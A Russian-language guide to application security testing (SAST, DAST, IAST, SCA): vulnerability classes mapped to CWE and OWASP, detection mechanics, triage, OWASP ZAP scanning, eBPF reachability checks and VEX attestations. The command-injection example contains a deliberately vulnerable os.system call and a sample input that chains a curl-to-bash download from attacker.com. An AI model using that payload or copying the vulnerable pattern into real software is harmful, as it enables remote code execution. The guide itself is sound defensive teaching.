# Уязвимости SAST и DAST

## Определения

**SAST (Static Application Security Testing — статическое тестирование безопасности приложений)** — метод анализа исходного кода, байт-кода или конфигураций без запуска приложения («белый ящик»). Инструменты SAST проверяют код на наличие паттернов уязвимостей, проблем с потоком данных (Data Flow) и логикой управления (Control Flow) до развертывания.

**DAST (Dynamic Application Security Testing — динамическое тестирование безопасности приложений)** — метод имитации атак на работающее приложение через его внешние интерфейсы (HTTP, API, WebSocket) («черный ящик»). DAST выявляет уязвимости времени выполнения, зависящие от конфигурации сервера, сетевых настроек и реальных потоков данных.

**IAST (Interactive Application Security Testing — интерактивное тестирование безопасности приложений)** — гибридный метод анализа («серый ящик»), сочетающий статический и динамический подходы. В 2026 году стандартом является использование **eBPF-инструментации** (Tetragon, Falco, Tracee), которая отслеживает выполнение кода и системные вызовы на уровне ядра без изменения исходного кода приложения. Альтернативный подход — агентная инструментация, требующая встраивания SDK в приложение.

**SCA (Software Composition Analysis — анализ состава ПО)** — автоматизированный процесс идентификации сторонних библиотек и зависимостей, оценки связанных с ними рисков безопасности и лицензионной чистоты. Подробнее — в **[анализе зависимостей и SBOM](../../Security/Supply_Chain_Security/dependency_and_sbom_analysis.md)**.

**ASPM (Application Security Posture Management)** — платформы оркестрации, которые агрегируют данные от SAST, DAST, SCA и IAST для корреляции находок, устранения дубликатов и приоритизации рисков.

## Базовые концепции

### Уязвимости, обнаруживаемые SAST

Статический анализ фокусируется на **Data Flow** (потоках данных) и **Control Flow** (логике управления), выявляя дефекты до развертывания кода.

| Категория | Примеры | CWE | OWASP Top 10:2025 |
| :--- | :--- | :--- | :--- |
| **Инъекции** | SQL/NoSQL Injection, OS Command Injection, LDAP Injection, SSTI | CWE-89, CWE-78, CWE-90, CWE-94 | A05:2025 Injection |
| **Межсайтовый скриптинг (XSS)** | Отраженный, хранимый, DOM-based XSS | CWE-79 | A05:2025 Injection |
| **Небезопасная десериализация** | Уязвимые библиотеки обработки объектов, приводящие к RCE | CWE-502 | A08:2025 Software or Data Integrity Failures |
| **Секреты и PII** | Пароли, токены, персональные данные в коде, комментариях, IaC-манифестах | CWE-798, CWE-200 | A02:2025 Security Misconfiguration |
| **Ошибки IaC** | Небезопасные конфигурации Docker (root), Kubernetes (отсутствие Network Policies), Terraform | CWE-16 | A02:2025 Security Misconfiguration |
| **Цепочки атак на workflows** | Использование небезопасных событий CI/CD (например, `pull_request_target`) и передача секретов в недоверенные шаги | — | A03:2025 Software Supply Chain Failures |

### Уязвимости, обнаруживаемые DAST

Динамический анализ имитирует поведение злоумышленника через внешние интерфейсы работающего приложения.

| Категория | Примеры | CWE | OWASP Top 10:2025 |
| :--- | :--- | :--- | :--- |
| **BOLA / IDOR** | Доступ к чужим объектам через манипуляцию ID в URL или теле запроса | CWE-639 | A01:2025 Broken Access Control |
| **BFLA** | Несанкционированный доступ к административным функциям API | CWE-862 | A01:2025 Broken Access Control |
| **Слепые уязвимости** | Blind SSRF, Blind SQLi (обнаружение через OAST — мониторинг внешних коллбэков) | CWE-918, CWE-89 | A01:2025 Broken Access Control |
| **Небезопасная конфигурация** | Ошибки в заголовках CORS, CSP, HSTS, открытые отладочные интерфейсы | CWE-16 | A02:2025 Security Misconfiguration |
| **Утечка данных** | Эксфильтрация PII и секретов в ответах API | CWE-200 | A04:2025 Cryptographic Failures |
| **Ошибки аутентификации** | Слабые сессии, отсутствие истечения токенов, фиксация сессии | CWE-287, CWE-613 | A07:2025 Authentication Failures |

| Уязвимость | Тип | SAST | DAST | SCA | IAST (eBPF) |
| :--- | :--- | :---: | :---: | :---: | :---: |
| **SQL / NoSQL Injection** | Логика | Да | Да | Нет | Да |

| **XSS** | Логика | Да | Да | Нет | Да |

| **Секреты / PII** | Данные | Да | Нет | Нет | Да |
| **Слепые уязвимости (Blind SSRF/SQLi)** | Сеть | Нет | Да | Нет | Да |
| **Небезопасная конфигурация** | Инфра | Да | Да | Нет | Нет |
| **Уязвимости зависимостей (CVE)** | Зависимости | Нет | Нет | Да | Нет |
| **Ошибки IaC (K8s/Docker)** | Инфра | Да | Нет | Да | Нет |

### Как SAST и DAST находят уязвимости (механизмы детектирования)

**SAST — анализ потоков данных (Data-flow / Taint analysis):** сканер помечает *источники* (source) небезопасных данных (ввод пользователя, переменные окружения, параметры HTTP) и отслеживает их распространение через переменные и вызовы функций до *стоков* (sink) — опасных операций (`exec`, SQL-запрос, `eval`). Если данные достигают стока без санитайзера (sanitizer), генерируется находка. Дополнительно анализируется *Control Flow* (логика ветвлений) и структурные паттерны. Подробнее о настройке инструментов — в **[SAST — обзор](./sast_overview.md)**.

**DAST — имитация атаки (Crawling + Fuzzing + OAST):** инструмент обходит приложение (crawler строит карту URL/форм/API), подставляет в параметры *fuzz*-нагрузки (кавычки, спецсимволы, большие объёмы) и анализирует ответы (ошибки, stack trace, изменение состояния). Для «слепых» уязвимостей (Blind SSRF/SQLi) используется **OAST** — мониторинг исходящих DNS/HTTP-коллбэков на внешний сервер. Аутентификация (сессии, токены, API-ключи) воспроизводится через контекст сканирования. Подробнее — в **[DAST — обзор](./dast_overview.md)**.

### Расширенная классификация уязвимостей (OWASP Top 10:2025 mapping)

Кроме перечисленных выше классов, SAST/DAST регулярно находят следующие категории (с указанием CWE и типичного метода детектирования):

| Категория (OWASP) | CWE | Что проверяется | SAST | DAST |
| :--- | :--- | :--- | :---: | :---: |
| **SSRF** (подделка запроса с сервера) | CWE-918 | исходящие запросы из пользовательского ввода (URL-фетчеры, вебхуки) | Да | Да (OAST) |
| **XXE** (внешние сущности XML) | CWE-611 | парсеры XML с включёнными внешними сущностями | Да | Редко |
| **Path Traversal** | CWE-22 | `../` в путях файловой системы | Да | Да |
| **CSRF** | CWE-352 | отсутствие anti-CSRF-токенов/заголовков | Да (по паттерну) | Частично |
| **Broken Authentication / Session** | CWE-287/613 | слабые сессии, отсутствие истечения, фиксация сессии | Да | Да |
| **Security Misconfiguration** | CWE-16 | дефолтные учётки, открытые порты, verbose errors | Да (IaC/конфиг) | Да |
| **Sensitive Data Exposure** | CWE-311/326 | слабая криптография, утечка данных в ответах/логах | Да | Да |
| **Improper Access Control** | CWE-284 | отсутствие проверки прав на уровне объекта/функции | Да | Да (BOLA/BFLA) |

В OWASP Top 10:2025 SSRF входит в категорию A01 Broken Access Control, а Software Supply Chain Failures (A03) отдельно выделяет риски зависимостей и целостности сборки.

Углублённая работа с зависимостями и SBOM — в **[анализе зависимостей и SBOM](../../Security/Supply_Chain_Security/dependency_and_sbom_analysis.md)**, а защита от SQL-инъекций — в **[SQL Injection: принципы и защита](../../Security/ApplicationSecurity/sql_injection.md)**.

## Практические сценарии

### Пример 1: Цепочки атак на workflows (Cordyceps)

Уязвимость возникает при использовании привилегированного триггера `pull_request_target` с автоматическим чекаутом кода из внешнего PR. Полный вектор атаки, эксплуатация и защита описаны в **[Атаки на CI/CD](./cicd_attacks.md)**.

**Обнаружение (SAST):** Сканер помечает комбинацию `pull_request_target` + `checkout` как **Critical**, так как это позволяет атакующему выполнить произвольный код с доступом к секретам.

### Пример 2: BOLA/IDOR в API (Detection via DAST)

Атака на изменение идентификатора пользователя для получения конфиденциальной информации.

```http
# Запрос DAST-сканера
GET /api/v1/user/profile/1001 HTTP/1.1
Authorization: Bearer <valid_token_for_user_1001>

# Сканер пробует манипуляцию
GET /api/v1/user/profile/1002 HTTP/1.1
Authorization: Bearer <valid_token_for_user_1001>
```

**Обнаружение (DAST):** Если сервер возвращает `200 OK` с данными пользователя `1002`, сканер фиксирует **BOLA** и генерирует Proof-of-Concept.

### Пример 3: Внедрение команд (Command Injection) в Python

```python
# Уязвимо: прямое использование ввода пользователя (SAST обнаружит Taint Flow)
host = request.args.get("host")
os.system("ping -c 1 " + host)
# host = "8.8.8.8; curl attacker.com/shell | bash"
```

```python
# Безопасно: использование защищенных абстракций
host = request.args.get("host")
subprocess.run(["ping", "-c", "1", host], check=True)
# subprocess.run автоматически экранирует аргументы
```

### Пример 4: Триаж находки SAST (процесс верификации и принятия решения)

Технический запуск сканера описан в **[SAST — обзор](./sast_overview.md)** и **[SAST vs DAST](./sast_vs_dast.md)**. Здесь — операционный процесс обработки конкретной находки инженером/SRE.

**Предусловия:** SARIF-отчёт из CI (например, `gl-sast-report.sarif`), доступ к коду, Semgrep/GitLab установлены локально для воспроизведения.

**1. Воспроизвести находку локально и проверить контекст:**

```bash
# локально повторить тот же набор правил, что в CI
semgrep scan --config p/ci --sarif -o repro.sarif
# посмотреть конкретную находку по rule-id
jq -r '.runs[].results[] | select(.ruleId=="python.lang.security.audit.os-command-injection")' repro.sarif
```

**2. Принять решение (триаж-матрица):**

| Ситуация | Действие |
| :--- | :--- |
| Подтверждённый баг, есть фикс | Создать PR/issue, назначить владельцу, SLA по критичности |
| Ложное срабатывание (sanitizer есть, но не распознан) | Inline-исключение `// nosemgrep` с обоснованием или уточнить правило |
| Уязвимость недостижима в рантайме (VEX) | Выпустить VEX-аттестацию `not_affected` (см. Пример 6), не блокировать релиз |

**Validation:** находка либо устранена (re-scan зелёный), либо задокументирована (suppression/VEX) с обоснованием, видимым в ASPM/DefectDojo.

**Troubleshooting:**
- *Слишком много FP:* сузьте набор правил (`p/ci` вместо `p/default`), добавьте `.semgrepignore`; не отключайте сканер целиком.
- *Находка не воспроизводится локально:* сверьте версию правил/образа сканера между CI и локалью.

### Пример 5: DAST базовое сканирование OWASP ZAP (операционно, self-hosted)

Канонический self-hosted DAST-инструмент — **OWASP ZAP**. Пример фокусируется на операционных аспектах: аутентификация, область сканирования и обработка FP (базовый пример команд см. в **[SAST vs DAST](./sast_vs_dast.md)**).

**Предусловия:** запущенный staging-экземпляр приложения в периметре, Docker, валидный токен/сессия для авторизованного сканирования.

**1. Baseline-скан (быстрый, passive) в контейнере:**

```bash
docker run --rm -v "$(pwd)/zap:/zap/wrk" \
  ghcr.io/zaproxy/zaproxy:stable zap-baseline.py \
  -t https://staging.internal.corp \
  -r zap-report.html -J zap-report.json \
  -z "-config globalexcludeurl.filterList=.*/static/.*"
# → baseline scan завершён, сохранены zap-report.html и zap-report.json
```

**2. Авторизованное сканирование API (передача токена):**

```bash
docker run --rm -v "$(pwd)/zap:/zap/wrk" \
  ghcr.io/zaproxy/zaproxy:stable zap-full-scan.py \
  -t https://staging.internal.corp/api \
  -H "Authorization: Bearer ${API_TOKEN}" \
  -r zap-api-report.html
# → full scan завершён, сохранён zap-api-report.html
```

**Validation:** отчёт содержит список алертов с уровнями риска; CI-шаг завершается ошибкой при превышении порога (`-l`/`--level`). Артефакты сохранены как CI-artifact.

**Troubleshooting:**
- *Много FP на static/assets:* исключите пути через `globalexcludeurl` или context.
- *Не проходит аутентификацию:* используйте ZAP Context с форм-логином или передавайте свежий токен (для API — через `-H`); не коммитьте токен в репозиторий.
- *Таймауты на больших сайтах:* увеличьте `-m` (макс. время) и ограничьте область (context).

### Пример 6: Корреляция и приоритизация через достижимость (Reachability + runtime)

Обнаруженная уязвимость неравноценна эксплуатируемой. SRE/Sysadmin использует рантайм-сигнал, чтобы снизить приоритет недостижимого кода и поднять — активно эксплуатируемого.

**Предусловия:** eBPF-инструментация (Falco/Tetragon/Tracee) на раннерах/подах, VEX-совместимый формат отчёта.

**1. Проверить, вызывается ли уязвимая функция в рантайме (Tetragon):**

```yaml
# trace-vuln.yaml — ловить вызов опасной функции в нужном бинаре
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "trace-os-system"
spec:
  kprobes:
  - call: "sys_execve"
    syscall: true
    args:
    - index: 0
      type: "string"
    selectors:
    - matchBinaries:
      - operator: "In"
        values: ["/usr/bin/app"]
```

```bash
kubectl apply -f trace-vuln.yaml
# → TracingPolicy trace-vuln.yaml создан
```

**2. Выпустить VEX-аттестацию для недостижимой уязвимости:**

```bash
# Создать VEX-документ (OpenVEX/CSAF)
cat <<EOF > vex-not-affected.json
{
  "document": {
    "category": "csaf_vex",
    "csaf_version": "2.0",
    "publisher": {
      "category": "vendor",
      "name": "Example Corp",
      "namespace": "https://example.com"
    },
    "title": "VEX Document for MyApp",
    "tracking": {
      "current_release_date": "2026-09-27T00:00:00Z",
      "id": "EXAMPLE-VEX-2026-001",
      "initial_release_date": "2026-09-27T00:00:00Z"
    },
    "vulnerabilities": [{
      "id": "CVE-2024-XXXX",
      "analysis": {
        "state": "not_affected",
        "justification": "code_not_reachable",
        "response": ["will_not_fix"],
        "detail": "Уязвимый код не вызывается в рантайме (подтверждено eBPF/Tetragon)"
      }
    }]
  }
}
EOF

# Применить VEX при сканировании SBOM
trivy sbom --vex vex-not-affected.json sbom.json
```

**Validation:** VEX загружен в ASPM/DefectDojo; находка помечена `not_affected` и исключена из блокирующих; активно эксплуатируемая — эскалирована в on-call.

**Troubleshooting:**
- *Нет рантайм-сигнала:* если eBPF недоступен, используйте IAST-агент или статический анализ покрытия вызовов; при отсутствии данных — консервативно считайте уязвимость достижимой.
- *VEX не принимается платформой:* проверьте схему (OpenVEX/CSAF) и идентификатор компонента.

## Оперативные команды

| Задача | Команда / Инструмент | Ожидаемый результат |
| :--- | :--- | :--- |
| **Инкрементальный SAST (Semgrep)** | `semgrep scan --config p/ci --sarif -o repro.sarif` | SARIF-отчёт с находками; exit code ≠ 0 при Critical/High |
| **Триаж находки по rule-id** | `jq -r '.runs[].results[] \| select(.ruleId=="python.lang.security.audit.os-command-injection")' repro.sarif` | JSON-отфильтрованная находка для анализа |
| **Качество SAST-отчёта** | `jq '[.runs[].results[] \| select(.level=="error")] \| length' repro.sarif` | Число Critical/High находок; `> 0` → FAIL |
| **DAST baseline (OWASP ZAP)** | `docker run --rm -v "$(pwd)/zap:/zap/wrk" ghcr.io/zaproxy/zaproxy:stable zap-baseline.py -t https://staging.internal.corp -r zap-report.html` | HTML-отчёт с алертами; baseline завершён |
| **Качество DAST-отчёта** | `jq '[.alerts[]? \| select(.riskcode=="3")] \| length' zap-report.json` | Число high-risk алертов; `> 0` → FAIL |
| **Сканирование зависимостей (Trivy)** | `trivy fs --severity CRITICAL --exit-code 1 .` | Exit code 1 при CRITICAL CVE; иначе 0 |
| **Генерация SBOM (Syft)** | `syft dir:. -o cyclonedx-json > sbom.json` | Файл sbom.json в формате CycloneDX |
| **Проверка SBOM** | `jq '.bomFormat' sbom.json` | `"CycloneDX"`; иначе ошибка формата |
| **Сканирование SBOM с VEX** | `trivy sbom --vex vex-not-affected.json sbom.json` | Уязвимости со статусом `not_affected` подавлены в отчёте |
| **Поиск секретов (Gitleaks)** | `gitleaks detect --source . --report-path gitleaks.json` | JSON-отчёт; exit code ≠ 0 при находках |

## Устранение неисправностей

| Симптом | Причина | Диагностика | Решение |
| :--- | :--- | :--- | :--- |
| **Много ложных срабатываний SAST** | Агрессивные правила, отсутствие baseline, санитайзеры не распознаны | Проверить `p/ci` vs `p/default`, добавить `.semgrepignore` | Сузить набор правил, добавить inline-исключения с обоснованием |
| **Находка не воспроизводится локально** | Разные версии правил/сканера между CI и локалью | Сравнить `semgrep --version`, версию правил | Синхронизировать образ сканера в CI и локаль |
| **Target not reachable (DAST)** | Раннер не видит стенд, стенд не поднят, firewall блокирует | `curl -I http://app:8080`, `nslookup staging.internal.corp` | Проверить сетевую связность, DNS, firewall; убедиться, что стенд запущен до DAST-джобы |
| **DAST не проходит аутентификацию** | Истекший токен, отсутствие сессии, сложная MFA | Проверить срок действия токена, логи ZAP | Использовать ZAP Context с форм-логином или передавать свежий токен через `-H` |
| **Таймауты DAST на больших сайтах** | Слишком большая область сканирования, низкий лимит времени | Проверить `-m` (макс. время), список контекстов | Увеличить `-m`, ограничить область (context), использовать `globalexcludeurl` |
| **Сканер пасует перед SPA** | Headless-краулер не видит маршруты в React/Vue/Next.js | Проверить покрытие в отчёте, наличие пустых разделов | Использовать OpenAPI-спецификацию для построения карты API |
| **Нет рантайм-сигнала (eBPF)** | Ядро не поддерживает eBPF, Tetragon/Falco/Tracee не установлен, права недостаточные | `bpftool prog list`, проверить privileges на подах | Использовать IAST-агент или консервативно считать уязвимость достижимой |
| **VEX не принимается платформой** | Неверная схема (OpenVEX/CSAF), отсутствует идентификатор компонента | Проверить валидацию JSON, логи импорта | Исправить схему, убедиться что `bomFormat` и `component.id` соответствуют платформе |
| **FP на static/assets (DAST)** | Сканер видит статические файлы как уязвимости | Проверить раздел `alerts` в отчёте | Исключить пути через `globalexcludeurl` или context |
| **Сканер зависает на сканировании** | Бесконечные редиректы, CAPTCHA, WAF блокирует | Проверить логи сканера, наличие 429/403 | Добавить задержки, исключить капчи, настроить User-Agent |
| **Недостаточно ресурсов на раннере** | Сканер потребляет всю CPU/RAM, слетают соседние джобы | `docker stats`, `top`, логи раннера | Установить cgroup-лимиты для джоб сканирования, вынести тяжёлые DAST-сканы в отдельный пул |
| **Утечка места на диске** | Артефакты сканирования не ротируются, логи разрастаются | `du -sh /builds/*/zap*`, проверить retention в CI | Настроить retention политику (например, 7–30 дней), сжимать артефакты |
| **Секреты сканера утекли в логи** | Токен DAST/API передан без маскирования | `grep -r "Bearer .*" $CI_LOG` | Использовать защищённые переменные CI, включить маскирование, ротировать скомпрометированный токен |

## Рекомендации

### Владение находками и SLO

- **Ownership:** каждая находка привязывается к владельцу сервиса (CODEOWNERS); без владельца находка не закрывается.
- **SLO триажа и MTTR:** критические — triage ≤ 24ч, fix ≤ 7 дней; высокие — triage ≤ 3 дней; метрики собираются в дашборде ASPM/DefectDojo.
- **Гейтинг в CI:** SAST/SCA запускаются на каждый MR (fail-fast), DAST — на staging по расписанию/после деплоя; блокировка релиза накладывается только на подтверждённые критические находки (через VEX/исключения с обоснованием).

### Дисциплина подавлений

- Inline-исключения (`nosemgrep`) и waivers только с обоснованием и сроком; периодический review подавлений, чтобы не накопить «тихие» уязвимости.
- Каждое исключение должно содержать: ссылку на issue, аргумент why, срок пересмотра.

### Корреляция с рантаймом

- Сигналы eBPF (Falco/Tetragon/Tracee) и IAST повышают приоритет реально эксплуатируемого; недостижимое — VEX (см. Пример 6).
- Reachability Analysis снижает количество блокирующих пайплайн находок, которые не могут быть эксплуатированы в текущей конфигурации.

### Операционные аспекты для DevOps / SRE / Sysadmin

- **Ресурсы раннеров:** для SAST/SCA выделите dedicated раннеры с фиксированными CPU/RAM лимитами; тяжёлые DAST-сканы выносите в отдельный пул с rate limiting, чтобы не флудить стенд и не тратить квоты параллельности.
- **Секреты для сканеров:** храните токены DAST/API в менеджере секретов (Vault, OIDC), а не в переменных CI; ротируйте их по SLA (например, 90 дней); используйте короткоживущие токены для сканирования.
- **Сетевая изоляция:** DAST-раннер должен видеть только целевой стенд (отдельный VLAN / docker network / network namespace); исключите выход в интернет и прод из контура сканирования.
- **Журналирование и аудит:** все запуски сканеров логируются в централизованный SIEM (JSON + метрики времени, статуса, количества находок). Retention — не менее 90 дней для compliance.
- **SLO сканирования:** целевые метрики: SAST ≤ 5 мин на репозиторий, DAST baseline ≤ 10 мин, full-scan ≤ 30 мин; uptime сканеров ≥ 99%. Превышение — эскалация в on-call.
- **Runbook для инцидента:** при обнаружении активной эксплуатации — эскалация в on-call, отзыв/ротация секретов, блокировка в WAF/API-шлюзе; документировать timeline, compromised vector, remediation steps для пост-мортема.
- **Change Management:** обновления образов сканеров проходят через Change Advisory Board (CAB) или асинхронный approval; тестируются на копии production-данных перед промоушеном в основной пул.

### Инцидент-респонс

- При обнаружении активной эксплуатации — эскалация в on-call, отзыв/ротация секретов, блокировка в WAF/API-шлюзе; см. **[Атаки на CI/CD](./cicd_attacks.md)**.
- Документировать timeline, compromised vector, remediation steps для пост-мортема.

### Метрики программы

- **Trend Findings:** new/closed за период.
- **Coverage:** процент репозиториев, охваченных сканированием.
- **MTTR:** среднее время устранения критических находок.
- **% подавлений:** доля исключений от общего числа находок.
- **Scan Success Rate:** процент успешных запусков сканеров без сбоев.
- Собираются в дашборде для ретроспектив и бюджета на техдолг.

### Связь с цепочкой поставок

- Уязвимости зависимостей приоритизируются по наличию патча и достижимости (см. **[обзор безопасности цепочки поставок](../../Security/Supply_Chain_Security/overview.md)**).

### Чек-лист внедрения

1. **SAST** подключён к каждому репозиторию и запускается на MR (fail-fast).
2. **SCA + SBOM** генерируются в сборке; уязвимости зависимостей трекаются.
3. **DAST** настроен на staging (ZAP baseline/active) с корректной аутентификацией и областью сканирования.
4. **IAST/eBPF** (опционально) даёт рантайм-подтверждение достижимости.
5. **VEX/исключения** оформляются только с обоснованием и сроком; подавления ревьюируются.
6. **Гейтинг релиза** блокирует только подтверждённые критические находки.
7. **Владение и SLO** назначены (CODEOWNERS, MTTR, дашборд).
8. **Инцидент-респонс** для активной эксплуатации задокументирован и проверен.
9. **Сеть и ресурсы:** DAST-раннер изолирован, ресурсы ограничены, retention настроен.
10. **Секреты:** токены сканеров в Vault/OIDC, ротация настроена.

## Дополнительная информация

### Нюансы анализа и приоритизации

- **Reachability Analysis:** Ключевой метрикой является не просто наличие уязвимости, а её достижимость. Если SAST нашел уязвимость в библиотеке, но IAST (eBPF) показывает, что уязвимая функция никогда не вызывается в рантайме, её приоритет снижается (VEX-аттестация).
- **False Positives Reduction:** Использование семантического анализа в SAST позволяет сократить количество ложных срабатываний за счет понимания контекста санитайзеров и проверок безопасности.
- **eBPF-наблюдаемость:** Позволяет обнаруживать эксплойты в реальном времени, фиксируя аномальные попытки чтения файлов (`/etc/passwd`) или сетевые соединения, инициированные легитимными процессами. Инструменты: Tetragon (Cilium), Falco (CNCF), Tracee (Aqua Security).
